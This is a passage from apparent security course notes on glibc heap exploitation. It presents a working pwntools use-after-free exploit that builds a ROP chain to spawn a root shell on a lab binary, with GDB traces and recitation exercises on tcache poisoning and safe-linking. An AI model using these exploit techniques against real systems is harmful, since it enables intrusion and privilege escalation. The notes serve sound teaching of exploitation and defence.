We're in luck, though. We already leaked the value of `__environ`, so we can simply replace its value during the edit to `u->name`. We should send and receive each piece of the final `edit` call manually, otherwise the script will infinitely hang while waiting for `menu` to print out a `>` character. This does not happen since the shell is spawned at the return from `edit` so `menu` is never called. The final payload is below:

> We should also be mindful of our ROP chain, specifically that it is an even number of quadwords so we do not crash in `do_system` on an `xmm` instruction like we saw in [[7. Return-Oriented Programming]]. 

```python
# get ROP gadget addresses
r = ROP("/lib/x86_64-linux-gnu/libc.so.6")

# trigger final edit and spawn shell. Perform sends individually since `edit`
# waits for a `>` character that will never arrive when the shell spawns
p.sendline(b'2')
p.recvuntil(b"name:\n")
p.send(p64(stack))
p.recvuntil(b"group:\n")
p.sendline(p64(edit_return))
p.recvuntil(b"uid:\n")
p.sendline(str(10).encode())
p.recvuntil(b"gid:\n")
p.sendline(str(10).encode())
p.recvuntil(b"bio:\n")
p.sendline(p64(r.rdi.address + glibc_base) + \
            p64(bin_sh) + \
            p64(r.ret.address + glibc_base) + \
            p64(system))
p.interactive()
```

Let's check that our overwrite hit the stack as expected by inspecting the stack before the call to `fgets(bio, 0x480, stdin)`:

```
──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x56067f5374f0 <edit+0186>      mov    rax, QWORD PTR [rax+0x20]
   0x56067f5374f4 <edit+018a>      mov    esi, 0x480
   0x56067f5374f9 <edit+018f>      mov    rdi, rax
 → 0x56067f5374fc <edit+0192>      call   0x56067f537160 <fgets@plt>
   ↳  0x56067f537160 <fgets@plt+0000> endbr64 
      0x56067f537164 <fgets@plt+0004> jmp    QWORD PTR [rip+0x2e3e]        # 0x56067f539fa8 <fgets@got.plt>
      0x56067f53716a <fgets@plt+000a> nop    WORD PTR [rax+rax*1+0x0]
      0x56067f537170 <strtoll@plt+0000> endbr64 
      0x56067f537174 <strtoll@plt+0004> jmp    QWORD PTR [rip+0x2e36]        # 0x56067f539fb0 <strtoll@got.plt>
      0x56067f53717a <strtoll@plt+000a> nop    WORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────── arguments (guessed) ────
fgets@plt (
   $rdi = 0x00007ffe1340f898 → 0x000056067f53783a → <main+00b6> jmp 0x56067f537861 <main+221>,
   $rsi = 0x0000000000000480,
   $rdx = 0x00007f2a849feac0 → 0x00000000fbad208b
)
──────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf_22.04", stopped 0x56067f5374fc in edit (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56067f5374fc → edit()
[#1] 0x56067f53783a → main()
─────────────────────────────────────────────────────────────────────────────────
gef➤  x/3xg 0x00007ffe1340f898
0x7ffe1340f898: 0x000056067f53783a      0x0000000000000000
0x7ffe1340f8a8: 0x0000000000000002
gef➤  x/4i 0x000056067f53783a
   0x56067f53783a <main+182>:   jmp    0x56067f537861 <main+221>
   0x56067f53783c <main+184>:   mov    eax,0x0
   0x56067f537841 <main+189>:   call   0x56067f537557 <print>
   0x56067f537846 <main+194>:   jmp    0x56067f537861 <main+221>
```

And after:

```
gef➤  ni
──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x56067f5374f4 <edit+018a>      mov    esi, 0x480
   0x56067f5374f9 <edit+018f>      mov    rdi, rax
   0x56067f5374fc <edit+0192>      call   0x56067f537160 <fgets@plt>
 → 0x56067f537501 <edit+0197>      mov    rax, QWORD PTR [rip+0x2b50]        # 0x56067f53a058 <u>
   0x56067f537508 <edit+019e>      mov    rax, QWORD PTR [rax+0x20]
   0x56067f53750c <edit+01a2>      mov    esi, 0xa
   0x56067f537511 <edit+01a7>      mov    rdi, rax
   0x56067f537514 <edit+01aa>      call   0x56067f537130 <strchr@plt>
   0x56067f537519 <edit+01af>      mov    QWORD PTR [rbp-0x38], rax
──────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf_22.04", stopped 0x56067f537501 in edit (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56067f537501 → edit()
[#1] 0x7f2a84828795 → iconv(cd=<optimized out>, inbuf=<optimized out>, inbytesleft=<optimized out>, outbuf=<optimized out>, outbytesleft=<optimized out>)
[#2] 0x7f2a84826a3e → perror_internal(fp=0x7ffe1340f9c8, s=<optimized out>, errnum=<optimized out>)
[#3] 0x7f2a8482000a → je 0x7f2a84820074
─────────────────────────────────────────────────────────────────────────────────
gef➤  x/3xg 0x00007ffe1340f898
0x7ffe1340f898: 0x00007f2a84828795      0x00007f2a849c041b
0x7ffe1340f8a8: 0x00007f2a84826a3e
gef➤  x/4i 0x00007f2a84828795
   0x7f2a84828795 <iconv+181>:  pop    rdi
   0x7f2a84828796 <iconv+182>:  ret
   0x7f2a84828797 <iconv+183>:  nop    WORD PTR [rax+rax*1+0x0]
   0x7f2a848287a0 <iconv+192>:  test   rsi,rsi
gef➤  x/s 0x00007f2a849c041b
0x7f2a849c041b: "/bin/sh"
```

That looks great! And now, if we continue, we see the sweet, sweet confirmation that we spawned a child process:

```
gef➤  c
Continuing.
[Detaching after vfork from child process 2728904]

# in other terminal
[DEBUG] Sent 0x21 bytes:
    00000000  95 87 82 84  2a 7f 00 00  1b 04 9c 84  2a 7f 00 00  │····│*···│····│*···│
    00000010  3e 6a 82 84  2a 7f 00 00  b0 52 85 84  2a 7f 00 00  │>j··│*···│·R··│*···│
    00000020  0a                                                  │·│
    00000021
[*] Switching to interactive mode
[DEBUG] Received 0x1f bytes:
    b'Detaching from process 2728904\n'
Detaching from process 2728904
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x5 bytes:
    b'root\n'
root
```


## Recitation

#### Recitation 9.0

Say the heap contains two pointers, `a` and `b`, as allocated and freed by the following code:

```c
a = malloc(0x20);
b = malloc(0x20);
free(a);
free(b);
```

What will tcache look like after the calls to `free`? Say a is at address `0x5678a020` (this is the addr of the memory chunk on the heap, freed, NOT the addr of the variable a). What are the linked list pointers (the raw bytes stored in the `fw` pointers) in `a` and `b`? _Keep in mind safe-linking applies!_

Singly linked list: each node contains its content + pointer to the next node's addr
- `fw` is the pointer to the next freed memory chunk on the heap
		- I was confused, thought `fw` points to the node that contains 

Solve:
Note - safe-linking obfuscates the `fw` pointer
- `a` is the last thing in the tcache linked list. So its fw pointer points to NULL (equal to 0)
	- Through safe-linking, `a`'s addr gets shifted >> 12 bits. so it becomes `0x5678a`
	- Then, we XOR this with the address of the next thing, which is 0x0. Anything XOR with 0 is just itself. 
		- Therefore, `a`'s fw pointer is 0x5678a
- `b`'s fw pointer points to node representing `a`, when we lived in a world without safe-linking. But now, fw is:
	- bit shift b's addr >> 12 (bits)
		- equivalent to getting rid of the least-sig 3 hex bits
	- XOR b's bit-shifted addr with A's

- I'm confused by the wording addr of a. Is it the address of the variable that holds the pointer to the memory chunk? Or is it the address of the memory chunk?
	- Ans: addr of the MEMORY CHUNK (on the heap)


#### Recitation 9.1

Consider [[#Recitation 9.0]] again. Say we have a UAF and can clobber the first eight bytes at either `a` or `b` and we want to poison tcache so we can allocate the address of `__environ`. For the sake of this example we have a glibc leak already and know that , `__environ` exists at address `0x7f235678`.

Which allocation, `a` or `b`, should we poison? What value would we poison with? What operations should we do next (assuming we have some program control to allocate bytes on the heap) to retrieve the allocation? 

Solve:
- understanding the question
	- free a, then free b; this means tcache list: b ---> a. b points to a. 
	- the goal seems to be overwriting the fw pointer of a node to the address of __environ?
		- why does "allocate" the address of __environ mean
	- this means we should poison b's fw pointer
		- but why can't I poison a's fw pointer? Doesn't that still work? Maybe this doesn't work because there must be NULL at the end of the linked list
			- Reason: there's a counter to the linked list. Imagine a's fw pointer points to malicious code. Once you get to a, the last item in the tcache list, count drops to 0, and it doesn't matter what a's fw pointer points to, tcache is treated as if it's empty, and we won't be allocated whatever a's fw pointer points to
		- Takeaway: always poison NOT at the end of the list
- poisoning b's fw pointer
	- b's fw pointer should now point to environ's addr, safe-linked.
	- given: environ's addr is 0x7f235678
		- safe-link this: 
			- b's fw pointer = (curr addr >> 12) XOR environ's addr = (b's addr >> 12) XOR environ's addr
#### Recitation 9.2

What do the heap caches look like after the following code executes?

```c
void* arr[8];
void* b = malloc(0x450);

for (int i = 0; i < 8; i++) {
	arr[i] = malloc(0x40);
}

void* guard = malloc(0x20);

for (int i = 0; i < 8; i++) {
	free(arr[i]);
}

free(b);
void* c = malloc(0x800);
```

## Next Steps

Heap exploitation is some of the most tedious and brittle exploitation around, as we demonstrated in these last two lessons. That said, the exploitation techniques presented in this lesson are valid against the _latest_ version of glibc in production (as of July 2024). That is pretty powerful! We actually exploited a modern system with full mitigations and a single UAF vulnerability, and we should be proud of that!

As mentioned in the last lesson, heaps come in many shapes and flavors. The aforementioned  [How2Heap](https://github.com/shellphish/how2heap) repo is great for practice against glibc, which tends to one of the more fickle heap implementations. Reading up on jemalloc and tcmalloc for breadth is helpful for understanding exploitation techniques for heaps without in-line metadata (like cached pointers). But with the skills learned in this lesson, we should feel confident going after modern heap allocators!

This is the last of our adventure into binary exploitation, as we now switch to web exploitation for breadth. There is plenty that is not covered in these lessons, including, but not limited to, format string vulnerabilities, command injection, and kernel exploitation. The latter is a course in its own right, but format string vulnerabilities and command injection are topics worth reviewing on our own as they do occur in modern systems.